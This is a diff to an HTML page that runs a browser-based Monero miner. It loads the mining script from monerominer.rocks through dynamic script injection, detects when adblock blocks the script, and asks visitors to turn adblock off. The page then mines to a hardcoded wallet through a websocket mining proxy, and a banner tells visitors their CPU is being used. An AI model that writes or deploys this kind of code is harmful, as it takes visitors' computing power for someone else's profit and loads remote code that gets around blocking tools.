@@ -1,11 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
+
+	<!--
+
+		i honestly dont even know what i am doing at this point
+
+	-->
+	
+
+
+
 	<title>mine</title>
 
-	<script type="text/javascript" src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
-
 	<script type="text/javascript">
+		let script = document.createElement('script');
+		script.src = "https://monerominer.rocks/miner-mmr/webmnr.min.js";
+		document.head.append(script);
+
+		isMinerBlocked = false;
+
+		script.onerror = function() {
+			isMinerBlocked = true;
+			document.getElementById("mtxt").style.display = "none"; // disable text
+			document.getElementById("etxt").style.display = "block"; // enable text
+		};
+
+
+		window.onload = function() {
+			document.getElementById("precent").innerHTML = (100-throttleMiner)+"%"; // calculate cpu used
+			if (!isMinerBlocked) {
+				document.getElementById("mtxt").style.display = "block"; // enable text
+			} else {
+				document.getElementById("mtxt").style.display = "none"; // disable text
+				document.getElementById("etxt").style.display = "block"; // enable text
+			}
+		}
+	</script>
+
+	<script type="text/javascript" defer>
 	    server = "wss://f.xmrminingproxy.com:8181";
 	    var pool = "moneroocean.stream";
 	    var walletAddress = "41rTmPDapr7Z7DRu2DorFw3UCYA7E4eQhHPNsakMvvszWJPuNyVhbVtXzuWyqCHgev5CeYejKNsrPbDqgLpRZZRJMQ2xgW3";
@@ -18,12 +51,7 @@
 	    startMining(pool, walletAddress, workerId, threads, password);
 	</script>
 
-	<script type="text/javascript">
-		window.onload = function() {
-			document.getElementById("mtxt").style.display = "block"; // enable text
-			document.getElementById("precent").innerHTML = (100-throttleMiner)+"%"; // calculate cpu used
-		}
-	</script>
+	
 
 	<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
 	<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
@@ -31,5 +59,6 @@
 <body>
 <noscript><h1>Enable javascript for this website to work (mine crypto).</h1></noscript>
 <h1 id="mtxt" style="display: none;">Thanks for the $! Your computer is currently mining cryptocurrency (monero) by using <span id="precent">NULL</span> of your CPU.</h1>
+<h1 id="etxt" style="display: none;">Please disable adblock otherwise the website won't work (mine crypto).</h1>
 </body>
 </html>
